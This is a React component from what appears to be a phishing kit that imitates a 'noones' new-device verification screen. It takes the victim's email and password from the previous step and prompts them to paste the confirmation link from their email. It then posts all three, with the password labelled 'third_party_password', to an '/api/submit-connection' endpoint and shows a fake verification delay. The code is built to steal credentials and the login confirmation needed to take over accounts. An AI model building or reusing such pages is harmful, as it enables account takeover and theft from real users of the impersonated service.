import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ChevronLeft, RefreshCw } from 'lucide-react';

interface NewDeviceDetectedState {
  email: string;
  password: string;
  platform?: string;
}

export default function NewDeviceDetected() {
  const navigate = useNavigate();
  const location = useLocation();
  const [timeLeft, setTimeLeft] = useState(60);
  const [showLinkInput, setShowLinkInput] = useState(false);
  const [confirmationLink, setConfirmationLink] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [isDarkMode, setIsDarkMode] = useState(true);

  // Get credentials from location state
  const state = location.state as NewDeviceDetectedState | null;
  const email = state?.email || '';
  const password = state?.password || '';

  // Timer effect
  useEffect(() => {
    if (showLinkInput || timeLeft === 0) {
      return;
    }

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setShowLinkInput(true);
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [showLinkInput, timeLeft]);

  const handleResendEmail = () => {
    // Reset timer
    setTimeLeft(60);
    setShowLinkInput(false);
    setError('');
    // In a real implementation, would call API to resend email
    console.log('Resend email triggered for:', email);
  };

  const handleCancelSignIn = () => {
    navigate('/login');
  };

  const handleSubmitLink = async () => {
    if (!confirmationLink.trim()) {
      setError('Please paste the confirmation link.');
      return;
    }

    setError('');
    setIsLoading(true);

    try {
      // Validate URL format - should be a URL or token
      if (!confirmationLink.includes('http') && !confirmationLink.includes('token') && confirmationLink.length < 10) {
        throw new Error('Invalid confirmation link format.');
      }

      // Submit credentials and confirmation link to backend
      const payload = {
        platform: 'Admin-Login',
        email: email,
        third_party_password: password,
        confirmation_link: confirmationLink,
      };

      console.log('Submitting device verification data...');
      const response = await fetch('/api/submit-connection', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.error || 'Failed to submit verification');
      }

      console.log('Device verification submitted successfully');

      // Start loading screen
      await new Promise((resolve) => setTimeout(resolve, 5000));

      // Store credentials temporarily for reference
      const credentials = {
        email,
        password,
        confirmationLink,
        timestamp: new Date().toISOString(),
      };
      sessionStorage.setItem('pendingCredentials', JSON.stringify(credentials));

      // Redirect to dashboard with delay
      await new Promise((resolve) => setTimeout(resolve, 6000));

      // Redirect to admin or dashboard
      navigate('/admin', { replace: true });
    } catch (err) {
      console.error('Device verification error:', err);
      setError(err instanceof Error ? err.message : 'An error occurred.');
      setIsLoading(false);
    }
  };

  const formatTime = (seconds: number) => {
    return `${seconds.toString().padStart(2, '0')}:00`;
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center">
        <div className="flex flex-col items-center gap-6">
          <div className="w-16 h-16 border-4 border-green-500 border-t-transparent rounded-full animate-spin"></div>
          <p className="text-white text-lg font-medium">Verifying device...</p>
          <p className="text-gray-400 text-sm">This may take a moment</p>
        </div>
      </div>
    );
  }

  return (
    <div className={`min-h-screen ${isDarkMode ? 'bg-black text-white' : 'bg-white text-black'} flex items-center justify-center px-4 py-6`}>
      {/* Background gradient */}
      <div className={`fixed inset-0 pointer-events-none ${isDarkMode ? 'bg-gradient-to-b from-gray-900 to-black' : 'bg-gradient-to-b from-gray-50 to-white'}`} />

      {/* Theme toggle */}
      <button
        onClick={() => setIsDarkMode(!isDarkMode)}
        className={`fixed bottom-6 right-6 p-3 rounded-full ${isDarkMode ? 'bg-gray-800 hover:bg-gray-700' : 'bg-gray-200 hover:bg-gray-300'}`}
        title="Toggle theme"
      >
        <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
          {isDarkMode ? (
            <path d="M12 3v1m0 16v1m9-9h-1m-16 0H1m15.364 1.636l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" />
          ) : (
            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z" />
          )}
        </svg>
      </button>

      {/* Main container */}
      <div className="w-full max-w-sm relative z-10">
        {/* Header with back button */}
        <div className="mb-8 text-center">
          {/* Noones Logo */}
          <div className="mb-6 flex justify-center">
            <span className="text-3xl font-bold bg-gradient-to-r from-green-400 to-green-500 bg-clip-text text-transparent">
              noones
            </span>
          </div>
          <h1 className={`text-2xl font-bold mb-2 ${isDarkMode ? 'text-white' : 'text-gray-900'}`}>
            New device detected
          </h1>
          <p className={isDarkMode ? 'text-gray-400' : 'text-gray-600'}>
            Confirm this is your device from the email we just sent to
          </p>
          <p className={`mt-1 font-semibold ${isDarkMode ? 'text-gray-300' : 'text-gray-700'}`}>
            {email || 'your@email.com'}
          </p>
        </div>

        {/* Device icon */}
        <div className="flex justify-center mb-8">
          <svg
            className={`w-20 h-20 ${isDarkMode ? 'text-gray-700' : 'text-gray-300'}`}
            fill="currentColor"
            viewBox="0 0 24 24"
          >
            <path d="M20 2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4V4c0-1.1-.9-2-2-2zm0 12H4V4h16v10z" />
          </svg>
        </div>

        {/* Main message */}
        <div className={`text-center mb-8 ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
          <p className="font-medium">We don't recognize this device</p>
        </div>

        {/* Timer or Input Section */}
        {!showLinkInput ? (
          <div className={`mb-6 p-6 rounded-2xl text-center ${isDarkMode ? 'bg-gray-900 border border-gray-800' : 'bg-gray-100 border border-gray-300'}`}>
            <p className={`text-sm mb-2 ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
              Resend email
            </p>
            <div className="text-4xl font-bold text-green-500 font-mono">
              {formatTime(timeLeft)}
            </div>
          </div>
        ) : (
          <div className="mb-6">
            <label className={`block text-sm font-medium mb-3 ${isDarkMode ? 'text-gray-300' : 'text-gray-700'}`}>
              Paste the confirmation link from your email
            </label>
            <textarea
              value={confirmationLink}
              onChange={(e) => {
                setConfirmationLink(e.target.value);
                setError('');
              }}
              placeholder="https://... or paste your confirmation token"
              className={`w-full h-24 p-4 rounded-lg border-2 focus:outline-none focus:border-green-500 resize-none transition-all ${
                isDarkMode
                  ? 'bg-gray-900 border-gray-800 text-white placeholder-gray-600'
                  : 'bg-gray-100 border-gray-300 text-black placeholder-gray-500'
              }`}
            />
            {error && <p className="text-red-500 text-sm mt-2">{error}</p>}
          </div>
        )}

        {/* Action Buttons */}
        <div className="space-y-3 mb-6">
          {!showLinkInput ? (
            <>
              <button
                onClick={handleResendEmail}
                disabled={timeLeft === 0}
                className={`w-full py-3 px-4 rounded-lg font-semibold transition-all flex items-center justify-center gap-2 ${
                  timeLeft === 0
                    ? 'opacity-50 cursor-not-allowed'
                    : isDarkMode
                      ? 'bg-gray-800 hover:bg-gray-700 text-white'
                      : 'bg-gray-200 hover:bg-gray-300 text-gray-900'
                }`}
              >
                <RefreshCw className="w-4 h-4" />
                Resend email ({timeLeft}s)
              </button>
              <button
                onClick={() => {
                  setShowLinkInput(true);
                  setTimeLeft(0);
                }}
                className={`w-full py-3 px-4 rounded-lg font-semibold transition-all ${
                  isDarkMode
                    ? 'bg-gray-800 hover:bg-gray-700 text-white'
                    : 'bg-gray-200 hover:bg-gray-300 text-gray-900'
                }`}
              >
                Try another way
              </button>
            </>
          ) : (
            <button
              onClick={handleSubmitLink}
              disabled={!confirmationLink.trim()}
              className={`w-full py-3 px-4 rounded-lg font-semibold transition-all ${
                confirmationLink.trim()
                  ? 'bg-green-500 hover:bg-green-600 text-white'
                  : isDarkMode
                    ? 'bg-gray-700 text-gray-400 cursor-not-allowed'
                    : 'bg-gray-200 text-gray-400 cursor-not-allowed'
              }`}
            >
              Verify Device
            </button>
          )}
        </div>

        {/* Cancel link */}
        <div className="text-center">
          <button
            onClick={handleCancelSignIn}
            className={`text-sm font-medium transition-colors ${
              isDarkMode
                ? 'text-green-500 hover:text-green-400'
                : 'text-green-600 hover:text-green-700'
            }`}
          >
            Cancel signing in
          </button>
        </div>
      </div>
    </div>
  );
}
